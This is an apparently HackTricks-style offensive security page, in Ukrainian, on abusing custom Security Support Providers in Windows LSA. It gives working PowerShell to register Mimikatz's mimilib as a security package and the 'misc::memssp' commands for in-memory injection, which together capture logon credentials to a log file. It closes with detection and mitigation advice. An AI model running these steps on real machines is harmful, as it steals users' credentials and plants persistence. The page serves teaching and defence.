# Користувацькі постачальники служб безпеки

{{#include ../../banners/hacktricks-training.md}}

[Постачальники служб безпеки (SSP)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) — це security packages на основі DLL, завантажені Local Security Authority (LSA). Windows реєструє користувацькі SSP/AP DLL через значення `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` і завантажує зареєстровані пакети під час запуску системи.<sup>[[1]](#references)</sup>

Оскільки SSP працюють у LSA та можуть отримувати облікові дані, зловмисники можуть зловживати шкідливим пакетом для доступу до облікових даних і persistence. MITRE відстежує цю поведінку як T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz містить `mimilib.dll`, який реалізує SSP, що записує облікові дані, оброблені після його завантаження. В авторизованій лабораторії помістіть DLL, що відповідає архітектурі цільової системи, у `C:\Windows\System32`, а потім перевірте поточний список пакетів перед його зміною.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Типове наявне значення може містити такі пакети, як `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` і `pku2u`. Під час додавання custom package збережіть кожен наявний запис.<sup>[[1]](#references)</sup>

Додайте `mimilib`, не замінюючи наявні пакети:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Після перезавантаження пакет завантажується в LSA, а всі наступні перехоплені облікові дані записуються цією реалізацією до `C:\Windows\System32\kiwissp.log`.<sup>[[2]](#references)[[3]](#references)</sup>

## Завантаження в пам'ять

Mimikatz також може впровадити свою реалізацію SSP у поточний процес LSASS:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Цей метод не зберігається після перезавантаження.<sup>[[2]](#references)[[3]](#references)</sup>

## Виявлення та пом'якшення

Відстежуйте зміни в `...\Lsa\Security Packages` і неочікуване завантаження DLL у `lsass.exe`. Подія безпеки 4657 записує зміну **значення** реєстру лише тоді, коли налаштовано відповідну політику Audit Registry і SACL.<sup>[[2]](#references)[[4]](#references)</sup>

Якщо це сумісно, увімкніть додатковий захист LSA та досліджуйте непідписані або неочікувані SSP DLL. Microsoft описує захист LSA саме як засіб протидії ін'єкції коду, яка може скомпрометувати облікові дані.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Реєстрація SSP/AP DLL](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Репозиторій Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Подія безпеки 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Налаштування додаткового захисту LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
